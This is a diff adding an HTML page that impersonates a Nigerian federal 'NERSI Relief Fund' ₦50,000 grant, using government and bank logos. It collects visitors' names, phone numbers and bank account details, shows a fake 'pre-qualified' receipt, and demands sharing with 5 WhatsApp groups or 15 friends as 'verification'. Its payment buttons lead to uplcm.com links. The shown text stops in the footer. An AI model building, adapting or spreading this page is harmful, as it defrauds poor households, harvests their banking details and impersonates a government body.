@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <title>NERSI RELIEF FUND - ₦50,000 GRANT</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <!-- Bootstrap & FontAwesome -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    
+    <!-- Meta Previews -->
+    <meta property="og:title" content="NERSI RELIEF FUND - ₦50,000 GRANT" />
+    <meta property="og:description" content="₦50,000 Relief Fund" />
+    <meta property="og:type" content="website" />
+
+    <style>
+        /* ═══════════════════════════════════════════ 
+           NERSI THEME & BASE STYLES
+        ═══════════════════════════════════════════ */
+        :root {
+            --nersi-green: #1f3e2c;      
+            --nersi-gold: #d4af37;       
+            --nersi-text: #333;
+            --nersi-gray: #666;
+        }
+
+        * { 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
+            box-sizing: border-box; 
+        }
+        
+        body { 
+            background-color: #f4f4f4;
+            background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIqNUoRdQB3dNqnLYk66GCE7agSHD0WBAJEXKjLffRWhMGQH846ihuH7lb3yaa8ecwf-0SoQLcE1rhEBOxNg6pF9OyMOcAy40gzRmQefBBxKU-f5IKnh3Cus47CBQp_LVUoBnGiOtT2fn9l1FOyfz-R0rvBPI1DBx7IUcZy5twrWubWJzQEk_XVUM8Kh8/s1635/35851.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            color: var(--nersi-text);
+        }
+        
+        a { text-decoration: none; }
+
+        /* ═══════════════════════════════════════════ 
+           HEADER
+        ═══════════════════════════════════════════ */
+        .nersi-header {
+            background: #fff;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #eee;
+            position: sticky;
+            top: 0;
+            z-index: 900;
+        }
+        .nersi-header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .nersi-logo-group {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+        .nersi-logo-group img { height: 40px; width: auto; }
+        .nersi-logo-group .min-logo { height: 45px; border-radius: 50%; border: 2px solid #006400; padding: 2px; }
+        .nersi-menu-btn {
+            border: 1.5px solid #ddd; border-radius: 8px; padding: 8px 12px;
+            font-size: 24px; color: var(--nersi-green); cursor: pointer; background: #fff;
+        }
+
+        /* ═══════════════════════════════════════════ 
+           HERO SECTION
+        ═══════════════════════════════════════════ */
+        .hero-section { background: var(--nersi-green); color: white; padding: 50px 20px; text-align: left; }
+        .hero-container { max-width: 600px; margin: 0 auto; }
+        .hero-eyebrow { font-size: 14px; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 15px; color: #d1e0d6; }
+        .hero-title { font-size: 42px; font-weight: 800; line-height: 1.1; margin-bottom: 20px; }
+        .hero-title span { color: var(--nersi-gold); }
+        .hero-desc { font-size: 18px; line-height: 1.5; margin-bottom: 10px; color: #e0e0e0; }
+
+        /* ═══════════════════════════════════════════ 
+           POPUP & BACKGROUND
+        ═══════════════════════════════════════════ */
+        #bgImage {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.8); z-index: 999; opacity: 0; pointer-events: none; transition: opacity 0.4s ease;
+        }
+        #bgImage.popup-bg-active { opacity: 1; pointer-events: auto; }
+
+        .popup-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; justify-content: center; align-items: center;
+            opacity: 0; pointer-events: none; transition: opacity 0.4s ease; z-index: 1000;
+        }
+        .popup-overlay.active { opacity: 1; pointer-events: auto; }
+        
+        .popup-box {
+            background-color: #fff;
+            background-image: linear-gradient(rgba(255,255,255,0.92), rgba(255,255,255,0.92)), url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIqNUoRdQB3dNqnLYk66GCE7agSHD0WBAJEXKjLffRWhMGQH846ihuH7lb3yaa8ecwf-0SoQLcE1rhEBOxNg6pF9OyMOcAy40gzRmQefBBxKU-f5IKnh3Cus47CBQp_LVUoBnGiOtT2fn9l1FOyfz-R0rvBPI1DBx7IUcZy5twrWubWJzQEk_XVUM8Kh8/s1635/35851.jpg');
+            background-size: cover; background-position: center;
+            padding: 25px 20px; border-radius: 12px; width: 420px; max-width: 92%;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); position: relative;
+            transform: translateY(-30px); transition: transform 0.4s ease; text-align: center;
+        }
+        .popup-overlay.active .popup-box { transform: translateY(0); }
+        
+        .popup-header-logos { display: flex; justify-content: center; gap: 10px; margin-bottom: 15px; }
+        .popup-header-logos img { height: 50px; width: auto; }
+        .popup-header-logos .min-logo { height: 55px; border-radius: 50%; border: 2px solid #006400; padding: 2px; background: #fff; }
+        
+        .popup-box h2 { font-size: 18px; color: var(--nersi-green); font-weight: 700; margin-bottom: 10px; line-height: 1.3; }
+        
+        .popup-partners { margin: 15px 0; border-top: 1px solid #eee; border-bottom: 1px solid #eee; padding: 15px 0; }
+        .popup-partners p { font-size: 13px; color: #666; margin-bottom: 10px; text-align: left; }
+        .partner-logos { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
+        .partner-logos img { height: 28px; width: auto; object-fit: contain; background: #fff; padding: 2px; border-radius: 4px; }
+
+        .popup-box .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; margin-bottom: 15px; outline: none; }
+        .popup-box .submit-btn {
+            width: 100%; padding: 14px; background-color: var(--nersi-green); color: white;
+            border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s;
+        }
+        .popup-box .submit-btn:hover { background-color: #0f1f16; }
+
+        /* ═══════════════════════════════════════════ 
+           MAIN FLOW & UI ELEMENTS
+        ═══════════════════════════════════════════ */
+        #flowWrapper { display: none; position: relative; z-index: 2; }
+
+        marquee {
+            background: var(--nersi-gold); color: var(--nersi-green);
+            padding: 8px; font-weight: bold; font-size: 14px; letter-spacing: 1px;
+        }
+
+        .post {
+            background: #fff; margin: 20px auto; padding: 25px; max-width: 550px;
+            border: 1px solid #e0e0e0; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .welcome { font-size: 15px; line-height: 1.6; color: #444; text-align: justify; }
+        .amount, #getname { color: var(--nersi-green); font-weight: 700; }
+        .tip { font-size: 14.5px; color: #555; line-height: 1.5; margin-bottom: 10px; }
+        .title { text-align: center; font-weight: 700; color: var(--nersi-green); font-size: 18px; margin-bottom: 15px; }
+        
+        button.btn-main {
+            display: block; width: 100%; max-width: 320px; height: 52px; color: #fff;
+            border: none; outline: none; font-size: 18px; font-weight: 800; cursor: pointer;
+            border-radius: 8px; margin: 15px auto; background: var(--nersi-green); transition: background 0.3s ease;
+        }
+        button.btn-main:hover { background: #0f1f16; }
+
+        .phone input, .phone select {
+            width: 100%; height: 50px; font-size: 15px; margin-bottom: 15px; padding: 10px 15px;
+            border: 1px solid #ccc; border-radius: 8px; outline: none; background: #f9f9f9;
+        }
+
+        #loader { text-align: center; padding: 40px 0; display: none; }
+        .spin {
+            width: 50px; height: 50px; border: solid 6px var(--nersi-green); border-right-color: transparent;
+            border-radius: 50%; margin: 15px auto; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 100% { transform: rotate(1turn); } }
+
+        .barr { max-width: 100%; margin: 15px auto; display: flex; align-items: center; gap: 10px; }
+        .fill { flex: 1; height: 30px; border: 2px solid var(--nersi-green); border-radius: 6px; padding: 2px; }
+        #fill, #fill2 { background: var(--nersi-green); width: 0%; height: 100%; border-radius: 3px; transition: width 0.1s linear; }
+        .percentage { width: 60px; text-align: right; font-size: 16px; font-weight: bold; color: var(--nersi-green); }
+
+        #info, #checking, #share, #claim { display: none; }
+
+        /* ═══════════════════════════════════════════ 
+           SHORT RECEIPT BOX & APP-LIKE STATUS
+        ═══════════════════════════════════════════ */
+        .receipt-box {
+            background: #f4f8f5;
+            border: 1px dashed var(--nersi-green);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .receipt-box p { font-size: 14px; margin-bottom: 8px; }
+        .receipt-box span { font-weight: bold; color: var(--nersi-green); }
+
+        /* Professional App-like Status Badge */
+        .status-badge {
+            background-color: #ffe5e5;
+            color: #d32f2f;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            vertical-align: middle;
+            animation: pulse-red 1.5s infinite;
+            margin-left: 5px;
+        }
+        
+        .status-badge::before {
+            content: '';
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            background-color: #d32f2f;
+            border-radius: 50%;
+            animation: blink-dot 1.5s infinite;
+        }
+
+        @keyframes pulse-red {
+            0% { box-shadow: 0 0 0 0 rgba(211, 47, 47, 0.4); }
+            70% { box-shadow: 0 0 0 5px rgba(211, 47, 47, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(211, 47, 47, 0); }
+        }
+        
+        @keyframes blink-dot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* IMAGE 1 FEATURES (Below Apply Now) */
+        .features-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; text-align: left; }
+        .feature-item { display: flex; align-items: center; gap: 8px; font-size: 15px; font-weight: 500; color: #333; }
+        .feature-dot { width: 10px; height: 10px; background-color: var(--nersi-gold); border-radius: 50%; flex-shrink: 0; }
+
+        /* ═══════════════════════════════════════════ 
+           FOOTER & SUPERCOUNTER
+        ═══════════════════════════════════════════ */
+        .nersi-footer { background: var(--nersi-green); color: #fff; padding: 40px 20px 20px; position: relative; z-index: 2; }
+        .nersi-footer-container { max-width: 1000px; margin: 0 auto; }
+        .footer-partners {
+            display: flex; align-items: center; flex-wrap: wrap; gap: 20px;
+            margin-bottom: 40px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 30px;
+        }
+        .footer-partners p { font-size: 16px; color: #d1e0d6; margin: 0; }
+        .footer-partner-logos { display: flex; gap: 15px; align-items: center; flex-wrap: wrap; }
+        .footer-partner-logos img { height: 35px; width: auto; background: #fff; padding: 4px; border-radius: 6px; }
+        
+        .footer-logos { display: flex; gap: 15px; margin-bottom: 20px; }
+        .footer-logos img { height: 60px; background: #fff; border-radius: 10px; padding: 5px; }
+        .footer-logos .min-logo { border-radius: 50%; border: 2px solid #006400; }
+
+        .footer-desc { font-size: 15px; line-height: 1.6; color: #d1e0d6; max-width: 800px; margin-bottom: 30px; }
+        .footer-links { display: flex; flex-wrap: wrap; gap: 20px; margin-bottom: 30px; font-size: 15px; }
+        .footer-links a { color: #fff; text-decoration: none; }
+        .footer-links a:hover { text-decoration: underline; }
+        .footer-legal { border-top: 1px solid rgba(255,255,255,0.2); padding-top: 20px; font-size: 13px; color: #a9c4b3; }
+
+        .footer-supercounter { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); }
+
+        @media (max-width: 600px) {
+            .nersi-header-left { gap: 10px; }
+            .nersi-logo-group img { height: 30px; }
+            .nersi-logo-group .min-logo { height: 35px; }
+            .footer-partner-logos img { height: 25px; }
+            .partner-logos img { height: 22px; }
+            .hero-title { font-size: 32px; }
+            .features-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- POPUP BACKGROUND LAYER -->
+    <div id="bgImage" class="popup-bg-active"></div>
+
+    <!-- POPUP MODAL -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-box">
+            <div class="popup-header-logos">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-w94XYiS24aFcCMApzM-7DDxzR4v4c0bOh0TLQ686ZmxQQ2GDXDS0aUgYfV5EWX4TpclrY6VZ4wz0jj9KL_slpWq9yfPFVvoTXGbhYe83iP9-UbXBs1XmteYgWiZk84q7BGe8ehLZgbB5Jjs-mY7QhBvMthAjkFBDeZXvTVI9jrWWlMBVbfbfDTQrfI4/s180/35812.png" alt="NERSI Logo" onerror="this.src='https://via.placeholder.com/50x50?text=NERSI'">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3-6qYiW0jky9PMCPMYsD1ggGKj3XP0w2ZTALFTllZV7MUJ8K3WQRY9WIS6SzXveGsiK8XMnGl02ckD3akOZ30oi5Lv-o_e92C6iPBDDiU7SLTbZR8hAfO1yo0H7IRMmFtmVqoahWaB6B2gcaGFeF4zaGoDlqhdKZZ7LfDCzR_70ixCpA3ksWhrQ8pasU/s200/35813.jpg" alt="Ministry Logo" class="min-logo" onerror="this.src='https://via.placeholder.com/55x55?text=FMH'">
+            </div>
+
+            <h2>BATCH A<br>NERSI RELIEF FUND</h2>
+            <p style="font-size: 14px; color: #555; margin-bottom: 15px;">Enter Your Details to Claim ₦50,000</p>
+
+            <div class="popup-partners">
+                <p>In partnership with</p>
+                <div class="partner-logos">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj__UKeOqL91PcCTRsOZn8qtQaWxs2Lun1ha4tB7TPCbP_yGPMYICtbK37HAhI7K7NjJNG8FIvULLtL3snC0QcMWgnaUQfeKPpumD-2phvCdzXBmvqy6Z2USyDqT-rLAI2EPmtjs7E86X8MG1_GGAXXDmHB6I3Khn_ZGaROYWovrbGsToWjHuOGfHrw4uk/s72/35814.png" alt="Wema" onerror="this.src='https://via.placeholder.com/60x25?text=Wema'">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5oE8YaHrdxMoG5FRqk2dn2Yiwaa2bKy-67JCqTXXaUA5oCGqHKXQxhWTeQKfciyqx0ucywt6_2R4J8GGZ3-0BnwVUDC_Grl-ASyHQ4qDyx4z2z9-khu2OirBXPD30EAABdLlwQR3DVOfAFuuAu-vQ-zg2wzQohKhFj1xMaMtarb04HPVm_4U7DnAdoFw/s72/35815.png" alt="MoMo" onerror="this.src='https://via.placeholder.com/60x25?text=MoMo'">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEir-Y7ic0C2TxQgZF1tdAFZn9rGE7G7GnXm0LpprrSrHklm9MFjwht4-KnYwfbwdi2pElCnDqawUYcswSXPyXYeBGfHSOz_vcmqueBNdOW-8L5O83mUi1rDEyojiBEEvHeW3oWdGN4rwOkYXkA8CtbxAE5SRxwYvLzcx0xmFHewazWFoZ9a-j8W4OO1Toc/s72/35816.png" alt="NairaGram" onerror="this.src='https://via.placeholder.com/60x25?text=NairaGram'">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKpb7htxn9PeB_9dC78yg-y-vdvZGfwH76U9mtHVtUTQD-pk3OXmnoEecqSzCkdJMU-udAL0YWE37UzMZpxm_CX830uQbxFUlkbMWwGBE0117ooWGAyxmcw7Ot7JEn4mNJ77f-MQ_6qnjkORrN1juBgdb5wNsTnzvevrGVYH2ea0bNisRZd52OCtO2LkE/s144/35817.png" alt="OPay" onerror="this.src='https://via.placeholder.com/60x25?text=OPay'">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgP7ba36VTTZu8vB1FefUlE7K7JZ2Fgv_7gIrUZjtZReTb6B3kKB5lkwNxsbCsbn4I7MvQq27ZeqDrgLKVpvWw7wkuUVd_VeI3n-IS8gmlqBR7qpiFsq4r6jDpvpN8qHcFCCpnaz5HaOYKjS23mDWv6myKUXdjNLT1HV1WUBjQbwXch95-8EUvkTA2Wzc0/s144/35818.png" alt="Moniepoint" onerror="this.src='https://via.placeholder.com/60x25?text=Moniepoint'">
+                </div>
+            </div>
+
+            <form id="popupForm">
+                <div class="form-group">
+                    <input type="tel" id="popupPhone" placeholder="Enter Phone/Bank Account No." required>
+                </div>
+                <button type="submit" class="submit-btn">CLAIM ₦50,000 NOW</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- HEADER -->
+    <header class="nersi-header">
+        <div class="nersi-header-left">
+            <div class="nersi-logo-group">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-w94XYiS24aFcCMApzM-7DDxzR4v4c0bOh0TLQ686ZmxQQ2GDXDS0aUgYfV5EWX4TpclrY6VZ4wz0jj9KL_slpWq9yfPFVvoTXGbhYe83iP9-UbXBs1XmteYgWiZk84q7BGe8ehLZgbB5Jjs-mY7QhBvMthAjkFBDeZXvTVI9jrWWlMBVbfbfDTQrfI4/s180/35812.png" alt="NERSI Logo" onerror="this.src='https://via.placeholder.com/40x40?text=NERSI'">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3-6qYiW0jky9PMCPMYsD1ggGKj3XP0w2ZTALFTllZV7MUJ8K3WQRY9WIS6SzXveGsiK8XMnGl02ckD3akOZ30oi5Lv-o_e92C6iPBDDiU7SLTbZR8hAfO1yo0H7IRMmFtmVqoahWaB6B2gcaGFeF4zaGoDlqhdKZZ7LfDCzR_70ixCpA3ksWhrQ8pasU/s200/35813.jpg" alt="Federal Ministry" class="min-logo" onerror="this.src='https://via.placeholder.com/45x45?text=FMH'">
+            </div>
+        </div>
+        <div class="nersi-menu-btn">&#9776;</div>
+    </header>
+
+    <!-- HERO SECTION -->
+    <section class="hero-section">
+        <div class="hero-container">
+            <p class="hero-eyebrow">FEDERAL GOVERNMENT OF NIGERIA</p>
+            <h1 class="hero-title">Relief that reaches <span>every home.</span></h1>
+            <p class="hero-desc">₦50,000 support for poor and vulnerable households, sent straight to your phone. No fees. No middlemen.</p>
+        </div>
+    </section>
+
+    <!-- MAIN FLOW WRAPPER -->
+    <div id="flowWrapper">
+        <marquee direction="left">FEDERAL GOVERNMENT OF NIGERIA · NERSI RELIEF FUND · GET ₦50,000 GRANT TODAY</marquee>
+
+        <!-- PAGE 1: LOADER -->
+        <div class="post" id="loader">
+            <p style="font-weight: bold; color: var(--nersi-green); font-size: 18px;">Verifying Eligibility...</p>
+            <div class="spin"></div>
+            <div id="num" style="font-weight: bold; font-size: 20px; color: var(--nersi-green);">0%</div>
+        </div>
+
+        <!-- PAGE 2: INTRO -->
+        <div class="post" id="intro" style="display: none;">
+            <p class="welcome">
+                <center>
+                    The application portal for the <span class="amount">NIGERIA EMERGENCY RELIEF AND STABILISATION INTERVENTION (NERSI) ₦50,000 GRANT</span> is currently open. This initiative, delivered by the Federal Ministry of Humanitarian Affairs, aims to provide financial relief to citizens. 
+                </center> 
+                <br> 
+                <center><span class="amount">ONLY FOR</span> NIGERIAN CITIZENS ABOVE 18.</center><br>
+            </p>
+            
+            <button id="go" class="btn-main">APPLY NOW</button>
+
+            <!-- IMAGE 1 FEATURES -->
+            <div class="features-grid">
+                <div class="feature-item"><div class="feature-dot"></div> Free to receive</div>
+                <div class="feature-item"><div class="feature-dot"></div> Consent comes first</div>
+                <div class="feature-item" style="grid-column: 1 / -1;"><div class="feature-dot"></div> Payments independently verified</div>
+            </div>
+        </div>
+
+        <!-- PAGE 3: INFO FORM -->
+        <div class="post" id="info" style="display: none;">
+            <p class="title">ENTER YOUR PERSONAL DETAILS:</p>
+            <div class="phone">
+                <center>
+                    <input type="text" placeholder="Full Name" id="name">
+                    <select id="state">
+                        <option value="" selected disabled>Select State</option>
+                        <option value="Abia">Abia</option><option value="Adamawa">Adamawa</option>
+                        <option value="Akwa Ibom">Akwa Ibom</option><option value="Anambra">Anambra</option>
+                        <option value="Bauchi">Bauchi</option><option value="Bayelsa">Bayelsa</option>
+                        <option value="Benue">Benue</option><option value="Borno">Borno</option>
+                        <option value="Cross River">Cross River</option><option value="Delta">Delta</option>
+                        <option value="Ebonyi">Ebonyi</option><option value="Edo">Edo</option>
+                        <option value="Ekiti">Ekiti</option><option value="Enugu">Enugu</option>
+                        <option value="FCT">FCT - Abuja</option><option value="Gombe">Gombe</option>
+                        <option value="Imo">Imo</option><option value="Jigawa">Jigawa</option>
+                        <option value="Kaduna">Kaduna</option><option value="Kano">Kano</option>
+                        <option value="Katsina">Katsina</option><option value="Kebbi">Kebbi</option>
+                        <option value="Kogi">Kogi</option><option value="Kwara">Kwara</option>
+                        <option value="Lagos">Lagos</option><option value="Nasarawa">Nasarawa</option>
+                        <option value="Niger">Niger</option><option value="Ogun">Ogun</option>
+                        <option value="Ondo">Ondo</option><option value="Osun">Osun</option>
+                        <option value="Oyo">Oyo</option><option value="Plateau">Plateau</option>
+                        <option value="Rivers">Rivers</option><option value="Sokoto">Sokoto</option>
+                        <option value="Taraba">Taraba</option><option value="Yobe">Yobe</option>
+                        <option value="Zamfara">Zamfara</option>
+                    </select>
+                    <input type="tel" placeholder="Phone Number" id="add">
+                    <input type="text" placeholder="Bank Account Number" id="nums">
+                    <select id="bank">
+                        <option value="" selected disabled>Select Your Bank</option>
+                        <option value="Access Bank">Access Bank</option>
+                        <option value="Citibank">Citibank</option>
+                        <option value="Ecobank">Ecobank</option>
+                        <option value="Fidelity Bank">Fidelity Bank</option>
+                        <option value="First Bank">First Bank</option>
+                        <option value="FCMB">FCMB</option>
+                        <option value="Globus Bank">Globus Bank</option>
+                        <option value="GTBank">GTBank</option>
+                        <option value="Heritage Bank">Heritage Bank</option>
+                        <option value="Jaiz Bank">Jaiz Bank</option>
+                        <option value="Keystone Bank">Keystone Bank</option>
+                        <option value="Kuda">Kuda</option>
+                        <option value="Lotus Bank">Lotus Bank</option>
+                        <option value="Moniepoint">Moniepoint</option>
+                        <option value="Opay">Opay</option>
+                        <option value="Palmpay">Palmpay</option>
+                        <option value="Parallex Bank">Parallex Bank</option>
+                        <option value="Polaris Bank">Polaris Bank</option>
+                        <option value="Premium Trust Bank">Premium Trust Bank</option>
+                        <option value="Providus Bank">Providus Bank</option>
+                        <option value="Stanbic IBTC">Stanbic IBTC</option>
+                        <option value="Standard Chartered">Standard Chartered</option>
+                        <option value="Sterling Bank">Sterling Bank</option>
+                        <option value="SunTrust Bank">SunTrust Bank</option>
+                        <option value="Taj Bank">Taj Bank</option>
+                        <option value="Titan Trust Bank">Titan Trust Bank</option>
+                        <option value="UBA">UBA</option>
+                        <option value="Union Bank">Union Bank</option>
+                        <option value="Unity Bank">Unity Bank</option>
+                        <option value="Wema Bank">Wema Bank</option>
+                        <option value="Zenith Bank">Zenith Bank</option>
+                        <option value="Other">Other</option>
+                    </select>
+                    <br>
+                    <button id="confirm" class="btn-main">Submit Application</button>
+                </center>
+                <p class="error" style="display:none; color:red; text-align:center;">Please fill all fields!</p>
+            </div>
+        </div>
+
+        <!-- PAGE 4: CHECKING -->
+        <div class="post" id="checking">
+            <p class="title">Processing Application...</p>
+            <div class="barr">
+                <div class="fill"><div id="fill"></div></div>
+                <div class="percentage"><span id="percentage">0%</span></div>
+            </div>
+        </div>
+
+        <!-- PAGE 5: SHARE -->
+        <div class="post" id="share">
+            <div class="receipt-box">
+                <p><b>Applicant Name:</b> <span id="getname"></span></p>
+                <p><b>State:</b> <span id="getstate"></span></p>
+                <p><b>Phone Number:</b> <span id="getadd"></span></p>
+                <p><b>Account Number:</b> <span id="getnum"></span></p>
+                <p><b>Bank:</b> <span id="getbank"></span></p>
+                
+                <!-- INLINE PENDING BADGE -->
+                <p style="margin-top: 10px; border-top: 1px solid #ddd; padding-top: 10px;">
+                    <b>Transaction Status:</b> <span class="status-badge">PENDING</span>
+                </p>
+            </div>
+
+            <h3 style="color: var(--nersi-green); text-align: center; margin-bottom: 10px;">🎉 Congratulations!</h3>
+            <p style="font-size: 15px; color: #333; text-align: center; margin-bottom: 15px;">
+                Your application has been <b>successfully received</b>, and you have been <b>pre-qualified</b> to receive the ₦50,000 Grant. 
+            </p>
+            <p class="tip" style="text-align: center;">To finalize your payment, please complete the human verification process below. Once verified, your account will be credited within 24–48 hours.</p>
+            
+            <br>
+            <p class="tip">1. Share this information with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
+            <p class="tip">2. You will be redirected automatically to our "Human verification approved page" after the GREEN verification bar is filled.</p>
+            
+            <button id="whatsapp" class="btn-main" style="background: #25D366; color: white;"><i class="fab fa-whatsapp"></i> SHARE</button>
+            
+            <div class="barr">
+                <div class="fill"><div id="fill2"></div></div>
+                <div class="percentage"><span id="percentage2">0%</span></div>
+            </div>
+        </div>
+
+        <!-- PAGE 6: CLAIM -->
+        <div class="post" id="claim">
+            <p class="title">Payment Approved</p>
+            <p style="font-size: 15px; text-align: center; color: #555; margin-bottom: 20px;">
+                Your information has been received. Click the links below to approve your payment to the bank details you provided during the registration process. Please note that payments may take 24 to 48 hours to reflect, as a large number of beneficiaries are currently being processed.
+            </p>
+            
+            <!-- Ad Buttons -->
+            <a onclick="window.open('https://uplcm.com/4/10077877')" href="https://uplcm.com/4/10077877">
+                <button class="btn-main" style="background: var(--nersi-green); font-size: 16px; margin-bottom: 10px;">GET PAYMENT</button>
+            </a>
+            <a onclick="window.open('https://uplcm.com/4/9742092')" href="https://uplcm.com/4/9742092">
+                <button class="btn-main" style="background: var(--nersi-green); font-size: 16px; margin-bottom: 10px;">GET CONFIRMATION CODE</button>
+            </a>
+            <a onclick="window.open('https://uplcm.com/4/9742301')" href="https://uplcm.com/4/9742301">
+                <button class="btn-main" style="background: var(--nersi-green); font-size: 16px; margin-bottom: 10px;">CHECK PAYMENT STATUS</button>
+            </a>
+            <a onclick="window.open('https://uplcm.com/4/10077877')" href="https://uplcm.com/4/10077877">
+                <button class="btn-main" style="background: var(--nersi-green); font-size: 16px; margin-bottom: 10px;">VERIFY ACCOUNT DETAILS</button>
+            </a>
+            <a onclick="window.open('https://uplcm.com/4/9742092')" href="https://uplcm.com/4/9742092">
+                <button class="btn-main" style="background: var(--nersi-green); font-size: 16px; margin-bottom: 10px;">DOWNLOAD RECEIPT</button>
+            </a>
+            
+            <button id="offer" class="btn-main" style="background: var(--nersi-gold); color: var(--nersi-green); margin-top: 15px; font-weight: 800;">APPROVE PAYMENT</button>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="nersi-footer">
+        <div class="nersi-footer-container">
+            
+            <div class="footer-partners">
+                <p>In partnership with</p>
+                <div class="footer-partner-logos">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj__UKeOqL91PcCTRsOZn8qtQaWxs2Lun1ha4tB7TPCbP_yGPMYICtbK37HAhI7K7NjJNG8FIvULLtL3snC0QcMWgnaUQfeKPpumD-2phvCdzXBmvqy6Z2USyDqT-rLAI2EPmtjs7E86X8MG1_GGAXXDmHB6I3Khn_ZGaROYWovrbGsToWjHuOGfHrw4uk/s72/35814.png" alt="Wema" onerror="this.src='https://via.placeholder.com/60x30?text=Wema'">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5oE8YaHrdxMoG5FRqk2dn2Yiwaa2bKy-67JCqTXXaUA5oCGqHKXQxhWTeQKfciyqx0ucywt6_2R4J8GGZ3-0BnwVUDC_Grl-ASyHQ4qDyx4z2z9-khu2OirBXPD30EAABdLlwQR3DVOfAFuuAu-vQ-zg2wzQohKhFj1xMaMtarb04HPVm_4U7DnAdoFw/s72/35815.png" alt="MoMo" onerror="this.src='https://via.placeholder.com/60x30?text=MoMo'">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEir-Y7ic0C2TxQgZF1tdAFZn9rGE7G7GnXm0LpprrSrHklm9MFjwht4-KnYwfbwdi2pElCnDqawUYcswSXPyXYeBGfHSOz_vcmqueBNdOW-8L5O83mUi1rDEyojiBEEvHeW3oWdGN4rwOkYXkA8CtbxAE5SRxwYvLzcx0xmFHewazWFoZ9a-j8W4OO1Toc/s72/35816.png" alt="NairaGram" onerror="this.src='https://via.placeholder.com/60x30?text=NairaGram'">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKpb7htxn9PeB_9dC78yg-y-vdvZGfwH76U9mtHVtUTQD-pk3OXmnoEecqSzCkdJMU-udAL0YWE37UzMZpxm_CX830uQbxFUlkbMWwGBE0117ooWGAyxmcw7Ot7JEn4mNJ77f-MQ_6qnjkORrN1juBgdb5wNsTnzvevrGVYH2ea0bNisRZd52OCtO2LkE/s144/35817.png" alt="OPay" onerror="this.src='https://via.placeholder.com/60x30?text=OPay'">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgP7ba36VTTZu8vB1FefUlE7K7JZ2Fgv_7gIrUZjtZReTb6B3kKB5lkwNxsbCsbn4I7MvQq27ZeqDrgLKVpvWw7wkuUVd_VeI3n-IS8gmlqBR7qpiFsq4r6jDpvpN8qHcFCCpnaz5HaOYKjS23mDWv6myKUXdjNLT1HV1WUBjQbwXch95-8EUvkTA2Wzc0/s144/35818.png" alt="Moniepoint" onerror="this.src='https://via.placeholder.com/60x30?text=Moniepoint'">
+                </div>
+            </div>
+
+            <div class="footer-logos">
